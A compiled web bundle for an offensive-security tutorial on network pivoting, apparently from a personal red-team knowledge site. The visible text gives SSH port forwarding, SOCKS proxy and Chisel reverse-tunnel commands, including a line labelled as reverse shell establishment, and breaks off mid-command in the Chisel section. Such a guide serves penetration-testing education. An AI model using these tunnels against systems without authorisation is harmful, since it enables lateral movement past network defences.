"use strict";(globalThis.webpackChunkgl_0_bal_01=globalThis.webpackChunkgl_0_bal_01||[]).push([[4044],{28453:(e,n,i)=>{i.d(n,{R:()=>o,x:()=>a});var t=i(96540);const s={},r=t.createContext(s);function o(e){const n=t.useContext(r);return t.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:o(e.components),t.createElement(r.Provider,{value:n},e.children)}},40565:(e,n,i)=>{i.r(n),i.d(n,{assets:()=>l,contentTitle:()=>a,default:()=>h,frontMatter:()=>o,metadata:()=>t,toc:()=>c});const t=JSON.parse('{"id":"cyber/pivoting-guide","title":"Comprehensive Network Pivoting in Adversarial Operations","description":"An exhaustive academic reference analyzing network pivoting methodologies, tools, and techniques for penetration testing and red team operations","source":"@site/docs/cyber/pivoting_guide.md","sourceDirName":"cyber","slug":"/cyber/pivoting-guide","permalink":"/cyber/pivoting-guide","draft":false,"unlisted":false,"editUrl":"https://github.com/gl0bal01/gl0bal01.github.io/tree/main/docs/cyber/pivoting_guide.md","tags":[{"inline":true,"label":"Pivoting","permalink":"/tags/pivoting"}],"version":"current","lastUpdatedAt":1749741333000,"sidebarPosition":1,"frontMatter":{"id":"pivoting-guide","title":"Comprehensive Network Pivoting in Adversarial Operations","sidebar_label":"Network Pivoting","sidebar_position":1,"description":"An exhaustive academic reference analyzing network pivoting methodologies, tools, and techniques for penetration testing and red team operations","keywords":["network pivoting","lateral movement","penetration testing","red teaming","post exploitation","chisel","ligolo-ng","havoc c2","villain","sliver","metasploit pivoting","gl0bal01","global01"],"authors":["gl0bal01"],"tags":["Pivoting"]},"sidebar":"tutorialSidebar","previous":{"title":"Cyber","permalink":"/cyber"},"next":{"title":"Password Cracking","permalink":"/cyber/password-cracking-guide"}}');var s=i(74848),r=i(28453);const o={id:"pivoting-guide",title:"Comprehensive Network Pivoting in Adversarial Operations",sidebar_label:"Network Pivoting",sidebar_position:1,description:"An exhaustive academic reference analyzing network pivoting methodologies, tools, and techniques for penetration testing and red team operations",keywords:["network pivoting","lateral movement","penetration testing","red teaming","post exploitation","chisel","ligolo-ng","havoc c2","villain","sliver","metasploit pivoting","gl0bal01","global01"],authors:["gl0bal01"],tags:["Pivoting"]},a="Comprehensive Network Pivoting in Adversarial Operations: An Academic Reference Manual",l={},c=[{value:"Abstract",id:"abstract",level:2},{value:"1. Introduction",id:"1-introduction",level:2},{value:"1.1 Pivoting Taxonomy",id:"11-pivoting-taxonomy",level:3},{value:"1.2 Common Pivoting Scenarios",id:"12-common-pivoting-scenarios",level:3},{value:"1.3 Evaluation Framework",id:"13-evaluation-framework",level:3},{value:"1.4 Tool Selection Decision Framework",id:"14-tool-selection-decision-framework",level:3},{value:"2. SSH-Based Pivoting Methodologies",id:"2-ssh-based-pivoting-methodologies",level:2},{value:"2.1 Local Port Forwarding",id:"21-local-port-forwarding",level:3},{value:"2.2 Remote Port Forwarding",id:"22-remote-port-forwarding",level:3},{value:"2.3 Dynamic Port Forwarding (SOCKS Proxy)",id:"23-dynamic-port-forwarding-socks-proxy",level:3},{value:"2.4 Advanced SSH Configuration",id:"24-advanced-ssh-configuration",level:3},{value:"2.5 SSH Tunneling Through HTTP Proxies",id:"25-ssh-tunneling-through-http-proxies",level:3},{value:"3. Chisel Framework: HTTP-Tunneled Network Pivoting",id:"3-chisel-framework-http-tunneled-network-pivoting",level:2},{value:"3.1 Server Configuration and Management",id:"31-server-configuration-and-management",level:3},{value:"3.2 Client Configuration Methodologies",id:"32-client-configuration-methodologies",level:3},{value:"3.3 Advanced Chisel Configurations",id:"33-advanced-chisel-configurations",level:3},{value:"4. Ligolo-ng: Transparent Network Tunneling",id:"4-ligolo-ng-transparent-network-tunneling",level:2},{value:"4.1 Infrastructure Setup and Configuration",id:"41-infrastructure-setup-and-configuration",level:3},{value:"4.2 Session Management and Network Configuration",id:"42-session-management-and-network-configuration",level:3},{value:"4.3 Advanced Tunneling Features",id:"43-advanced-tunneling-features",level:3},{value:"5. Metasploit Framework: Comprehensive Pivoting Integration",id:"5-metasploit-framework-comprehensive-pivoting-integration",level:2},{value:"5.1 Session-Based Routing Configuration",id:"51-session-based-routing-configuration",level:3},{value:"5.2 SOCKS Proxy Implementation",id:"52-socks-proxy-implementation",level:3},{value:"5.3 Port Forwarding Mechanisms",id:"53-port-forwarding-mechanisms",level:3},{value:"5.4 Advanced Metasploit Pivoting Techniques",id:"54-advanced-metasploit-pivoting-techniques",level:3},{value:"6. Havoc C2: Modern Command and Control Pivoting",id:"6-havoc-c2-modern-command-and-control-pivoting",level:2},{value:"6.1 Agent Deployment and Configuration",id:"61-agent-deployment-and-configuration",level:3},{value:"6.2 TCP Pivot Implementation",id:"62-tcp-pivot-implementation",level:3},{value:"6.3 SOCKS Proxy Configuration",id:"63-socks-proxy-configuration",level:3},{value:"6.4 Advanced Havoc Pivoting Features",id:"64-advanced-havoc-pivoting-features",level:3},{value:"7. Villain Framework: Collaborative C2 with Session Sharing",id:"7-villain-framework-collaborative-c2-with-session-sharing",level:2},{value:"7.1 Framework Installation and Setup",id:"71-framework-installation-and-setup",level:3},{value:"7.2 Payload Generation and Management",id:"72-payload-generation-and-management",level:3},{value:"7.3 Session Management and Interaction",id:"73-session-management-and-interaction",level:3},{value:"7.4 Collaborative Features and Sibling Servers",id:"74-collaborative-features-and-sibling-servers",level:3},{value:"7.5 Advanced Villain Techniques",id:"75-advanced-villain-techniques",level:3},{value:"7.6 HoaxShell Integration",id:"76-hoaxshell-integration",level:3},{value:"8. Sliver Framework: Modern Go-Based C2 with Advanced Pivoting",id:"8-sliver-framework-modern-go-based-c2-with-advanced-pivoting",level:2},{value:"8.1 Server Setup and Configuration",id:"81-server-setup-and-configuration",level:3},{value:"8.2 Listener Configuration",id:"82-listener-configuration",level:3},{value:"8.3 Implant Generation",id:"83-implant-generation",level:3},{value:"8.4 Pivoting and Network Tunneling",id:"84-pivoting-and-network-tunneling",level:3},{value:"8.5 Advanced Sliver Operations",id:"85-advanced-sliver-operations",level:3},{value:"8.6 Beacon Management",id:"86-beacon-management",level:3},{value:"8.7 Detection Evasion Features",id:"87-detection-evasion-features",level:3},{value:"8.8 Multi-Hop Pivot Chains",id:"88-multi-hop-pivot-chains",level:3},{value:"9. Windows-Specific Pivoting Tools",id:"9-windows-specific-pivoting-tools",level:2},{value:"9.1 Netsh Port Forwarding",id:"91-netsh-port-forwarding",level:3},{value:"9.2 Plink (PuTTY Link) Implementation",id:"92-plink-putty-link-implementation",level:3},{value:"9.3 PowerShell-Based Pivoting",id:"93-powershell-based-pivoting",level:3},{value:"10. Cross-Platform Tunneling Solutions",id:"10-cross-platform-tunneling-solutions",level:2},{value:"10.1 rpivot: HTTP-Based Tunneling",id:"101-rpivot-http-based-tunneling",level:3},{value:"10.2 reGeorg: Web Application Tunneling",id:"102-regeorg-web-application-tunneling",level:3},{value:"10.3 Stunnel: TLS Encryption Wrapper",id:"103-stunnel-tls-encryption-wrapper",level:3},{value:"10.4 dnscat2: DNS Tunneling",id:"104-dnscat2-dns-tunneling",level:3},{value:"11. Socat: Swiss Army Knife of Network Relays",id:"11-socat-swiss-army-knife-of-network-relays",level:2},{value:"11.1 Basic Relay Configurations",id:"111-basic-relay-configurations",level:3},{value:"11.2 Encrypted Tunneling",id:"112-encrypted-tunneling",level:3},{value:"11.3 Advanced Socat Implementations",id:"113-advanced-socat-implementations",level:3},{value:"12. Proxychains: Transparent Proxy Integration",id:"12-proxychains-transparent-proxy-integration",level:2},{value:"12.1 Configuration Management",id:"121-configuration-management",level:3},{value:"12.2 Chain Configuration Types",id:"122-chain-configuration-types",level:3},{value:"12.3 Application Integration",id:"123-application-integration",level:3},{value:"13. Advanced Pivot Chaining Methodologies",id:"13-advanced-pivot-chaining-methodologies",level:2},{value:"13.1 Multi-Hop Architecture Design",id:"131-multi-hop-architecture-design",level:3},{value:"Implementation Strategy:",id:"implementation-strategy",level:4},{value:"13.2 Hierarchical Routing Implementation",id:"132-hierarchical-routing-implementation",level:3},{value:"13.3 Cascade Tunneling Example",id:"133-cascade-tunneling-example",level:3},{value:"14. Detection Evasion and Operational Security",id:"14-detection-evasion-and-operational-security",level:2},{value:"14.1 Operational Timeline and Evasion Strategy",id:"141-operational-timeline-and-evasion-strategy",level:3},{value:"14.2 Traffic Analysis Evasion",id:"142-traffic-analysis-evasion",level:3},{value:"Protocol Mimicry Techniques:",id:"protocol-mimicry-techniques",level:4},{value:"Timing Randomization:",id:"timing-randomization",level:4},{value:"Volume Control Implementation:",id:"volume-control-implementation",level:4},{value:"14.2 Behavioral Analysis Evasion",id:"142-behavioral-analysis-evasion",level:3},{value:"Credential Management:",id:"credential-management",level:4},{value:"Session Timing Patterns:",id:"session-timing-patterns",level:4},{value:"Process Injection for Stealth:",id:"process-injection-for-stealth",level:4},{value:"14.3 Memory-Only Operations",id:"143-memory-only-operations",level:3},{value:"Fileless Agent Deployment:",id:"fileless-agent-deployment",level:4},{value:"In-Memory Tunneling:",id:"in-memory-tunneling",level:4},{value:"14.4 Advanced Evasion Techniques",id:"144-advanced-evasion-techniques",level:3},{value:"Domain Fronting:",id:"domain-fronting",level:4},{value:"Steganographic Tunneling:",id:"steganographic-tunneling",level:4},{value:"Certificate Pinning Bypass:",id:"certificate-pinning-bypass",level:4},{value:"15. Platform-Specific Implementation Considerations",id:"15-platform-specific-implementation-considerations",level:2},{value:"15.1 Linux-Specific Techniques",id:"151-linux-specific-techniques",level:3},{value:"15.2 Windows-Specific Implementations",id:"152-windows-specific-implementations",level:3},{value:"15.3 Container and Cloud Environments",id:"153-container-and-cloud-environments",level:3},{value:"16. Monitoring and Defensive Considerations",id:"16-monitoring-and-defensive-considerations",level:2},{value:"16.1 Detection Signatures",id:"161-detection-signatures",level:3},{value:"Connection Pattern Analysis:",id:"connection-pattern-analysis",level:4},{value:"Protocol Analysis:",id:"protocol-analysis",level:4},{value:"16.2 Defensive Countermeasures",id:"162-defensive-countermeasures",level:3},{value:"17. Legal and Ethical Considerations",id:"17-legal-and-ethical-considerations",level:2},{value:"17.1 Authorization Requirements",id:"171-authorization-requirements",level:3},{value:"17.2 Documentation Requirements",id:"172-documentation-requirements",level:3},{value:"18. Conclusion",id:"18-conclusion",level:2},{value:"References",id:"references",level:2}];function d(e){const n={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",li:"li",mermaid:"mermaid",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,r.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"comprehensive-network-pivoting-in-adversarial-operations-an-academic-reference-manual",children:"Comprehensive Network Pivoting in Adversarial Operations: An Academic Reference Manual"})}),"\n",(0,s.jsx)(n.h2,{id:"abstract",children:"Abstract"}),"\n",(0,s.jsx)(n.p,{children:"This comprehensive academic reference presents an exhaustive analysis of network pivoting methodologies, tools, and techniques employed in modern adversarial operations. We examine seventeen primary pivoting frameworks across multiple platforms, providing detailed implementation examples, operational security considerations, and advanced detection evasion techniques. This manual serves as both theoretical foundation and practical implementation guide for cybersecurity researchers and practitioners."}),"\n",(0,s.jsx)(n.h2,{id:"1-introduction",children:"1. Introduction"}),"\n",(0,s.jsx)(n.p,{children:"Network pivoting constitutes the foundational technique for lateral movement within segmented network infrastructures. This methodology enables adversaries to leverage compromised intermediary systems as communication conduits to access otherwise isolated network segments, effectively circumventing perimeter defenses and network isolation policies."}),"\n",(0,s.jsx)(n.h3,{id:"11-pivoting-taxonomy",children:"1.1 Pivoting Taxonomy"}),"\n",(0,s.jsx)(n.p,{children:"Network pivoting methodologies can be systematically categorized into four primary classes:"}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Port Forwarding"}),": Direct TCP/UDP port redirection through compromised hosts"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Protocol Tunneling"}),": Encapsulation of network traffic within alternative communication protocols"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Proxy Chain Establishment"}),": Sequential routing through multiple intermediary proxy systems"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Virtual Network Creation"}),": Implementation of virtual network interfaces for transparent communication"]}),"\n"]}),"\n",(0,s.jsx)(n.h3,{id:"12-common-pivoting-scenarios",children:"1.2 Common Pivoting Scenarios"}),"\n",(0,s.jsx)(n.p,{children:"The following diagram illustrates typical network architectures encountered in adversarial operations:"}),"\n",(0,s.jsx)(n.mermaid,{value:"graph TD\n    A[Internet] --\x3e B[DMZ Host<br/>Web Server]\n    A --\x3e C[VPN Gateway]\n    \n    B --\x3e D[Internal Network<br/>192.168.1.0/24]\n    C --\x3e D\n    \n    D --\x3e E[Workstation<br/>Finance Dept]\n    D --\x3e F[Database Server<br/>10.10.10.100]\n    D --\x3e G[Domain Controller<br/>Active Directory]\n    \n    E --\x3e H[Restricted Network<br/>172.16.0.0/16]\n    F --\x3e I[Database Cluster<br/>Backend Systems]\n    G --\x3e J[Management Network<br/>192.168.100.0/24]\n    \n    H --\x3e K[Critical Server<br/>SCADA/ICS]\n    I --\x3e L[Backup Systems<br/>Offline Storage]\n    J --\x3e M[Infrastructure<br/>Network Equipment]\n    \n    style A fill:#ff9999\n    style B fill:#ffcc99\n    style C fill:#ffcc99\n    style D fill:#99ccff\n    style E fill:#99ffcc\n    style F fill:#99ffcc\n    style G fill:#99ffcc\n    style H fill:#ccccff\n    style I fill:#ccccff\n    style J fill:#ccccff\n    style K fill:#ffcccc\n    style L fill:#ffcccc\n    style M fill:#ffcccc"}),"\n",(0,s.jsx)(n.h3,{id:"13-evaluation-framework",children:"1.3 Evaluation Framework"}),"\n",(0,s.jsx)(n.p,{children:"Each pivoting methodology is evaluated across seven critical dimensions:"}),"\n",(0,s.jsxs)(n.table,{children:[(0,s.jsx)(n.thead,{children:(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.th,{children:"Framework"}),(0,s.jsx)(n.th,{children:"Stealth"}),(0,s.jsx)(n.th,{children:"Protocols"}),(0,s.jsx)(n.th,{children:"Platform"}),(0,s.jsx)(n.th,{children:"Complexity"}),(0,s.jsx)(n.th,{children:"Transparency"}),(0,s.jsx)(n.th,{children:"Persistence"}),(0,s.jsx)(n.th,{children:"Evasion"})]})}),(0,s.jsxs)(n.tbody,{children:[(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"SSH"}),(0,s.jsx)(n.td,{children:"Medium"}),(0,s.jsx)(n.td,{children:"TCP"}),(0,s.jsx)(n.td,{children:"*nix/Win"}),(0,s.jsx)(n.td,{children:"Low"}),(0,s.jsx)(n.td,{children:"Medium"}),(0,s.jsx)(n.td,{children:"High"}),(0,s.jsx)(n.td,{children:"Medium"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Chisel"}),(0,s.jsx)(n.td,{children:"High"}),(0,s.jsx)(n.td,{children:"TCP/UDP"}),(0,s.jsx)(n.td,{children:"Cross"}),(0,s.jsx)(n.td,{children:"Medium"}),(0,s.jsx)(n.td,{children:"Medium"}),(0,s.jsx)(n.td,{children:"High"}),(0,s.jsx)(n.td,{children:"High"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Ligolo-ng"}),(0,s.jsx)(n.td,{children:"High"}),(0,s.jsx)(n.td,{children:"TCP/UDP"}),(0,s.jsx)(n.td,{children:"Cross"}),(0,s.jsx)(n.td,{children:"Medium"}),(0,s.jsx)(n.td,{children:"High"}),(0,s.jsx)(n.td,{children:"Medium"}),(0,s.jsx)(n.td,{children:"High"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Metasploit"}),(0,s.jsx)(n.td,{children:"Low"}),(0,s.jsx)(n.td,{children:"TCP"}),(0,s.jsx)(n.td,{children:"Cross"}),(0,s.jsx)(n.td,{children:"Low"}),(0,s.jsx)(n.td,{children:"Low"}),(0,s.jsx)(n.td,{children:"Medium"}),(0,s.jsx)(n.td,{children:"Low"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Havoc C2"}),(0,s.jsx)(n.td,{children:"High"}),(0,s.jsx)(n.td,{children:"TCP/HTTP(S)"}),(0,s.jsx)(n.td,{children:"Cross"}),(0,s.jsx)(n.td,{children:"Medium"}),(0,s.jsx)(n.td,{children:"High"}),(0,s.jsx)(n.td,{children:"High"}),(0,s.jsx)(n.td,{children:"High"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Villain"}),(0,s.jsx)(n.td,{children:"High"}),(0,s.jsx)(n.td,{children:"TCP/HTTP(S)"}),(0,s.jsx)(n.td,{children:"Cross"}),(0,s.jsx)(n.td,{children:"Low"}),(0,s.jsx)(n.td,{children:"Medium"}),(0,s.jsx)(n.td,{children:"High"}),(0,s.jsx)(n.td,{children:"High"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Sliver"}),(0,s.jsx)(n.td,{children:"High"}),(0,s.jsx)(n.td,{children:"Multi"}),(0,s.jsx)(n.td,{children:"Cross"}),(0,s.jsx)(n.td,{children:"Medium"}),(0,s.jsx)(n.td,{children:"High"}),(0,s.jsx)(n.td,{children:"High"}),(0,s.jsx)(n.td,{children:"Very High"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Socat"}),(0,s.jsx)(n.td,{children:"Medium"}),(0,s.jsx)(n.td,{children:"TCP/UDP"}),(0,s.jsx)(n.td,{children:"*nix"}),(0,s.jsx)(n.td,{children:"High"}),(0,s.jsx)(n.td,{children:"Low"}),(0,s.jsx)(n.td,{children:"Low"}),(0,s.jsx)(n.td,{children:"Medium"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Netsh"}),(0,s.jsx)(n.td,{children:"Medium"}),(0,s.jsx)(n.td,{children:"TCP"}),(0,s.jsx)(n.td,{children:"Windows"}),(0,s.jsx)(n.td,{children:"Medium"}),(0,s.jsx)(n.td,{children:"Medium"}),(0,s.jsx)(n.td,{children:"High"}),(0,s.jsx)(n.td,{children:"Medium"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Plink"}),(0,s.jsx)(n.td,{children:"Medium"}),(0,s.jsx)(n.td,{children:"TCP"}),(0,s.jsx)(n.td,{children:"Windows"}),(0,s.jsx)(n.td,{children:"Low"}),(0,s.jsx)(n.td,{children:"Medium"}),(0,s.jsx)(n.td,{children:"High"}),(0,s.jsx)(n.td,{children:"Medium"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"rpivot"}),(0,s.jsx)(n.td,{children:"High"}),(0,s.jsx)(n.td,{children:"HTTP(S)"}),(0,s.jsx)(n.td,{children:"Cross"}),(0,s.jsx)(n.td,{children:"Medium"}),(0,s.jsx)(n.td,{children:"Medium"}),(0,s.jsx)(n.td,{children:"Medium"}),(0,s.jsx)(n.td,{children:"High"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"reGeorg"}),(0,s.jsx)(n.td,{children:"High"}),(0,s.jsx)(n.td,{children:"HTTP(S)"}),(0,s.jsx)(n.td,{children:"Web"}),(0,s.jsx)(n.td,{children:"High"}),(0,s.jsx)(n.td,{children:"Low"}),(0,s.jsx)(n.td,{children:"Low"}),(0,s.jsx)(n.td,{children:"High"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Stunnel"}),(0,s.jsx)(n.td,{children:"High"}),(0,s.jsx)(n.td,{children:"TCP/TLS"}),(0,s.jsx)(n.td,{children:"Cross"}),(0,s.jsx)(n.td,{children:"Medium"}),(0,s.jsx)(n.td,{children:"Medium"}),(0,s.jsx)(n.td,{children:"High"}),(0,s.jsx)(n.td,{children:"High"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"dnscat2"}),(0,s.jsx)(n.td,{children:"Very High"}),(0,s.jsx)(n.td,{children:"DNS"}),(0,s.jsx)(n.td,{children:"Cross"}),(0,s.jsx)(n.td,{children:"High"}),(0,s.jsx)(n.td,{children:"Low"}),(0,s.jsx)(n.td,{children:"Medium"}),(0,s.jsx)(n.td,{children:"Very High"})]})]})]}),"\n",(0,s.jsx)(n.admonition,{title:"Note",type:"note",children:(0,s.jsx)(n.p,{children:"Evaluation criteria are based on operational field experience, security research publications, and comparative analysis of tool capabilities in controlled environments. Ratings represent relative assessments under typical deployment scenarios and may vary based on specific implementation, configuration, and defensive posture of target networks."})}),"\n",(0,s.jsx)(n.h3,{id:"14-tool-selection-decision-framework",children:"1.4 Tool Selection Decision Framework"}),"\n",(0,s.jsx)(n.p,{children:"The following flowchart provides a systematic approach for selecting appropriate pivoting tools based on operational constraints:"}),"\n",(0,s.jsx)(n.mermaid,{value:"flowchart TD\n    A[Start: Pivot Required] --\x3e B{Target OS?}\n    \n    B --\x3e|Windows Only| C{Admin Rights?}\n    B --\x3e|Linux/Unix| D{SSH Available?}\n    B --\x3e|Cross-Platform| E{Stealth Required?}\n    \n    C --\x3e|Yes| F[netsh portproxy<br/>PowerShell scripts]\n    C --\x3e|No| G[plink.exe<br/>Chisel client]\n    \n    D --\x3e|Yes| H{Network Restrictions?}\n    D --\x3e|No| I[Chisel<br/>Ligolo-ng]\n    \n    H --\x3e|Minimal| J[SSH Dynamic Forward<br/>ssh -D]\n    H --\x3e|Strict Firewall| K[HTTP Tunneling<br/>Chisel/rpivot]\n    \n    E --\x3e|High Stealth| L{Protocol Preference?}\n    E --\x3e|Medium Stealth| M[Metasploit<br/>Standard Tools]\n    \n    L --\x3e|HTTP/HTTPS| N[Chisel HTTPS<br/>reGeorg<br/>Havoc C2]\n    L --\x3e|DNS| O[dnscat2<br/>DNS Tunneling]\n    L --\x3e|TLS| P[Stunnel<br/>Ligolo-ng TLS]\n    \n    I --\x3e Q{Transparency Needed?}\n    Q --\x3e|Yes - Direct Tool Access| R[Ligolo-ng<br/>TUN Interface]\n    Q --\x3e|No - SOCKS OK| S[Chisel<br/>SSH SOCKS]\n    \n    F --\x3e T[Implementation]\n    G --\x3e T\n    J --\x3e T\n    K --\x3e T\n    M --\x3e T\n    N --\x3e T\n    O --\x3e T\n    P --\x3e T\n    R --\x3e T\n    S --\x3e T\n    \n    style A fill:#e1f5fe\n    style T fill:#c8e6c9\n    style N fill:#fff3e0\n    style O fill:#fff3e0\n    style P fill:#fff3e0\n    style R fill:#f3e5f5"}),"\n",(0,s.jsx)(n.admonition,{type:"note",children:(0,s.jsx)(n.p,{children:"This decision framework presents a simplified selection process focusing on primary pivoting tools. Modern C2 frameworks like Villain and Sliver offer multi-protocol support and can be used across multiple paths in this flowchart. For example, Sliver supports HTTP/HTTPS, DNS, mTLS, and WireGuard protocols, while Villain excels in collaborative scenarios with HTTP/HTTPS tunneling. The framework prioritizes tool selection based on immediate operational constraints rather than comprehensive capability assessment."})}),"\n",(0,s.jsx)(n.h2,{id:"2-ssh-based-pivoting-methodologies",children:"2. SSH-Based Pivoting Methodologies"}),"\n",(0,s.jsx)(n.admonition,{type:"note",children:(0,s.jsx)(n.p,{children:"The following SSH commands assume you have installed OpenSSH on all relevant hosts. Substitute all placeholder values (e.g., user, pivot_host, 192.168.1.100) with those specific to your environment. Ensure you have valid credentials and network connectivity between client and target hosts."})}),"\n",(0,s.jsx)(n.p,{children:"SSH represents the most ubiquitous and well-documented pivoting mechanism, leveraging the native capabilities of the OpenSSH implementation for network traffic redirection."}),"\n",(0,s.jsx)(n.h3,{id:"21-local-port-forwarding",children:"2.1 Local Port Forwarding"}),"\n",(0,s.jsx)(n.p,{children:"Local port forwarding establishes a listening port on the client machine that forwards connections to a destination through the SSH server:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Basic local port forwarding\nssh -L [bind_address:]local_port:destination_host:destination_port user@ssh_server\n\n# Forward local port 8080 to internal web server\nssh -L 8080:192.168.1.100:80 user@pivot_host\n\n# Bind to specific interface (security consideration)\nssh -L 127.0.0.1:8080:192.168.1.100:80 user@pivot_host\n\n# Forward multiple ports simultaneously\nssh -L 8080:192.168.1.100:80 -L 3389:192.168.1.101:3389 user@pivot_host\n\n# Background execution with compression\nssh -fN -C -L 8080:192.168.1.100:80 user@pivot_host\n"})}),"\n",(0,s.jsx)(n.h3,{id:"22-remote-port-forwarding",children:"2.2 Remote Port Forwarding"}),"\n",(0,s.jsx)(n.p,{children:"Remote port forwarding creates a listening port on the SSH server that forwards connections back to the client:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Basic remote port forwarding\nssh -R [bind_address:]remote_port:destination_host:destination_port user@ssh_server\n\n# Forward pivot host port 8080 to local web server\nssh -R 8080:127.0.0.1:80 user@pivot_host\n\n# Enable GatewayPorts for external access\nssh -o GatewayPorts=yes -R 8080:127.0.0.1:80 user@pivot_host\n\n# Reverse shell establishment\nssh -R 4444:127.0.0.1:4444 user@pivot_host\n\n# Database access through reverse tunnel\nssh -R 3306:database_server:3306 user@pivot_host\n"})}),"\n",(0,s.jsx)(n.h3,{id:"23-dynamic-port-forwarding-socks-proxy",children:"2.3 Dynamic Port Forwarding (SOCKS Proxy)"}),"\n",(0,s.jsx)(n.p,{children:"Dynamic port forwarding establishes a SOCKS proxy server on the client machine:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Basic SOCKS proxy on port 9050\nssh -D 9050 user@pivot_host\n\n# SOCKS proxy with specific binding\nssh -D 127.0.0.1:9050 user@pivot_host\n\n# Background SOCKS proxy with compression\nssh -fN -C -D 9050 user@pivot_host\n\n# SOCKS proxy with connection multiplexing\nssh -M -S /tmp/ssh-socket -fN -D 9050 user@pivot_host\n\n# Reuse existing connection\nssh -S /tmp/ssh-socket -O check user@pivot_host\n"})}),"\n",(0,s.jsx)(n.h3,{id:"24-advanced-ssh-configuration",children:"2.4 Advanced SSH Configuration"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# ~/.ssh/config optimization for pivoting\nHost pivot\n    HostName pivot_host\n    User username\n    Port 22\n    DynamicForward 9050\n    LocalForward 8080 192.168.1.100:80\n    ControlMaster auto\n    ControlPath ~/.ssh/sockets/%r@%h-%p\n    ControlPersist 600\n    Compression yes\n    ServerAliveInterval 60\n    ServerAliveCountMax 3\n    TCPKeepAlive yes\n"})}),"\n",(0,s.jsx)(n.h3,{id:"25-ssh-tunneling-through-http-proxies",children:"2.5 SSH Tunneling Through HTTP Proxies"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Connect through HTTP proxy using ProxyCommand\nssh -o ProxyCommand='nc --proxy-type http --proxy proxy_host:8080 %h %p' user@target\n\n# Using corkscrew for HTTP proxy traversal\nssh -o ProxyCommand='corkscrew proxy_host 8080 %h %p' user@target\n\n# SOCKS proxy traversal\nssh -o ProxyCommand='nc --proxy-type socks5 --proxy socks_proxy:1080 %h %p' user@target\n"})}),"\n",(0,s.jsx)(n.h2,{id:"3-chisel-framework-http-tunneled-network-pivoting",children:"3. Chisel Framework: HTTP-Tunneled Network Pivoting"}),"\n",(0,s.jsx)(n.admonition,{type:"note",children:(0,s.jsxs)(n.p,{children:["Ensure the Chisel binary is available on both server and client machines before executing these commands. Replace server_ip, username",":password",", ports, and interface names to match your environment."]})}),"\n",(0,s.jsx)(n.p,{children:"Chisel implements a fast TCP/UDP tunnel transported over HTTP, secured via SSH-like encryption, optimized for restrictive network environments."}),"\n",(0,s.jsx)(n.h3,{id:"31-server-configuration-and-management",children:"3.1 Server Configuration and Management"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Basic server with authentication\nchisel server --port 8080 --auth username:password\n\n# Server with reverse tunneling capability\nchisel server --port 8080 --auth username:password --reverse\n\n# HTTPS server with custom certificates\nchisel server --port 443 --key private.key --cert cert.pem --auth user:pass\n\n# Server with specific binding interface\nchisel server --host 0.0.0.0 --port 8080 --auth user:pass\n\n# Server with logging configuration\nchisel server --port 8080 --auth user:pass --log-level debug --logfile chisel.log\n\n# Server with backend restrictions\nchisel server --port 8080 --auth user:pass --backend="127.0.0.1:*"\n'})}),"\n",(0,s.jsx)(n.h3,{id:"32-client-configuration-methodologies",children:"3.2 Client Configuration Methodologies"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Basic SOCKS proxy establishment\nchisel client --auth username:password server_ip:8080 R:socks\n\n# SOCKS proxy on specific port\nchisel client --auth username:password server_ip:8080 R:5000:socks\n\n# Local port forwarding\nchisel client --auth username:password server_ip:8080 3306:internal_db:3306\n\n# Remote port forwarding (reverse)\nchisel client --auth username:password server_ip:8080 R:8000:127.0.0.1:80\n\n# Multiple tunnel establishment\nchisel client server_ip:8080 3306:db:3306 8888:web:80 1433:sql:1433 R:socks\n\n# UDP tunneling support\nchisel client server_ip:8080 R:53:dns_server:53/udp\n"})}),"\n",(0,s.jsx)(n.h3,{id:"33-advanced-chisel-configurations",children:"3.3 Advanced Chisel Configurations"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Connection through corporate proxies\nchisel client --auth user:pass --proxy https://corp-proxy:8080 server_ip:8080 